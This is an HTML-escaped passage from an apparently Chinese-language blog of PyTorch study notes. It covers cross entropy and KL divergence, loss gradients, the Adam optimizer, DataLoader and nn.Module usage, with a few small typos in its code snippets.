&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Cross \space Entropy = H(p,q) = - \sum p(x)logq(x) \\
 = H(p) + D_{KL}(p|q)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.6000100000000002em;vertical-align:-0.55001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-symbol large-op&#34; style=&#34;position:relative;top:-0.000004999999999977245em;&#34;&gt;∑&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;D_{KL}(p|q)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;定义为散度，当两个分布重合的部分越低，也就是越不相似，其值越高，反之越低。&lt;/p&gt;
&lt;p&gt;在分类的问题当中，通常采用one-hot编码，这种编码的Entropy为0，带入到Cross Entropy中：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;K&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;Cross \space Entropy = D_{KL}(p|q)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.07153em;&#34;&gt;K&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;恰好是两个分布的散度，我们可以将其作为优化目标，也就是模型的预测分布和真实分布之间的散度，最小化该散度，也就是最小化两个分布之间的差距。&lt;/p&gt;
&lt;p&gt;可以求二分类和多分类问题的损失值，搭配softmax激活函数效果会更好。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;binary&lt;/li&gt;
&lt;li&gt;multi-class&lt;/li&gt;
&lt;li&gt;softmax&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;51-loss梯度&#34;&gt;5.1 Loss梯度&lt;/h4&gt;
&lt;p&gt;由于模型的目标是将loss降到最低，因此需要找到loss的最小值，那么通过对loss求导的方式寻找。&lt;/p&gt;
&lt;p&gt;Loss的梯度求解有两种方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;torch.autograd.grad(loss, [w1, w2, ...])&lt;/p&gt;
&lt;p&gt;用最后的loss对参数[w1, w1, ...]进行求偏导，返回一个导数值的列表&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;loss.backward()&lt;/p&gt;
&lt;p&gt;这种方法是求解梯度并进行反向传播，也就是说该方法完成了梯度的求解过程以及反向传播的过程&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# MSE均方误差
x = torch.ones(1)
w = torch.full([1],2)  # y = wx
mse = F.mse_loss(torch.ones(1), x*w)
# 计算loss的梯度
torch.autograd.grad(mse, [w])  # 第一个参数是loss，第二个参数是所有网络参数

# 或者loss对象可以直接调用backward()
mse.backward()

&amp;quot;&amp;quot;&amp;quot;
CEL
&amp;quot;&amp;quot;&amp;quot;
a = torch.rand(3)
p = F.softmax(a, dim=0)
p.backward()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;6-优化算法&#34;&gt;6. 优化算法&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;x = torch.tensor([0, 0], requires_grad=True)
optimizer = torch.optim.Adam([x], lr=1e-3)  # 创建优化器对象，传入的是待优化的参数和学习率

for step in range(20000):
    pred = f(x)
    
    optimizer.zero_grad()
    pred.backward()  # 就会生成相应的梯度信息
    optimizer.step()  # 每次调用一次step函数就会更新一次x&#39; = x - lr*dx, y&#39; = y - lr*dy...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-datasetdataloader&#34;&gt;7. Dataset/DataLoader&lt;/h3&gt;
&lt;h4 id=&#34;71-dataset&#34;&gt;7.1 Dataset&lt;/h4&gt;
&lt;h4 id=&#34;72-dataloader&#34;&gt;7.2 DataLoader&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.utils.data.DataLoader()

# 常用参数
- dataset
- batch_size
- shuffle 顺序打乱，默认为False
- num_workers 加载数据的线程数量，默认为0，主线程加载

dataloader = DataLoader(dataset, 64, shuffle=True)
for batch_data, targets in dataloader:
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8-nnlinear&#34;&gt;8. nn.Linear()&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554574378.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;8-nnmodule模块&#34;&gt;8. nn.Module模块&lt;/h3&gt;
&lt;p&gt;当自己需要实现一个网络模型的时候需要继承这个类，在内部定义的每一个层次也是nn.Module类，所以它们之间有嵌套关系。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every Layer is nn.Module&lt;/li&gt;
&lt;li&gt;nn.Module nested in nn.Module&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;继承nn.Module类后，需要在&lt;code&gt;__init__(self)&lt;/code&gt;函数中定义自己网络的所有层结构，然后在&lt;code&gt;forward(self)&lt;/code&gt;函数中串联每个层。&lt;/p&gt;
&lt;h4 id=&#34;81-容器container&#34;&gt;8.1 容器container&lt;/h4&gt;
&lt;p&gt;如果层次非常多的话，可以将所有层次都定义在&lt;code&gt;nn.Sequential()&lt;/code&gt;中：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;self.net = nn.Sequential(
	nn.Conv2d(1, 32, 5, 1, 1),
    nn.MaxPool(2, 2),
    nn.ReLU(True),
    nn.BatchNorm2d(32),
    
    nn.Conv2d(32, 64, 3, 1, 1),
    nn.ReLU(True),
    nn.BatchNorm2d(64),
    
    ...
    # 这其中可以用自己的定义的其它网络
)
# 注意Squential接受的参数都是class
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种方式就不需要为每个层定义一个变量，也不需要为每个其进行forward串联。&lt;/p&gt;
&lt;h4 id=&#34;82-参数管理&#34;&gt;8.2 参数管理&lt;/h4&gt;
&lt;p&gt;nn.Module会对网络中的参数进行管理，&lt;code&gt;net.parameters()&lt;/code&gt;会返回所有网络中的参数，通常使用这种方法将所有参数传到优化器中去。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class BasicNet(nn.Module):
    def __init__(self):
        super(BasicNet, self).__init__()
        self.net = nn.Linear(4, 3)
    
    def forward(self, x):
        return self.net(x)
    
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.net = nn.Sequential(
        	BasicNet(),
            nn.ReLU(),
            nn.Linear(3,2)
        )
    
    def forward(self, x):
        return self.net(x)
    
device = torch.device(&#39;cuda&#39;)
net = Net()
net.to(device)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;save/load&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.load_state_dict(torch.load(&#39;ckpt.mdl&#39;))
# train...

torch.save(net.stat_dict(), &#39;ckpt.mdl&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;train/test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于dropout等有的层结构来说，train和test的状态是不太一样的，nn.Module提供了状态切换的方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.train()  # train
net.eval()  # test
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3 id=&#34;9-pytorch神经网络结构&#34;&gt;9. PyTorch神经网络结构&lt;/h3&gt;
&lt;p&gt;神经网络可以通过torch.nn包来构建。神经网络是基于自动梯度来定义一些模型，一个nn.Module包括层和一个forwoard(input)方法，返回为output。&lt;/p&gt;
&lt;p&gt;例如一个前馈神经网络，它接受输入，让输入一个接着一个的通过一些层，最后给出输出。&lt;/p&gt;
&lt;p&gt;一个典型的神经网络训练过程包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定义一个包含可训练参数的神经网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;迭代整个输入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过神经网络处理输入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;计算损失&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;反向传播梯度到神经网络的参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更新网络参数，典型的用一个简单的更新方法：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;_&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;weight = weight - learning\_rate * gradient
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; 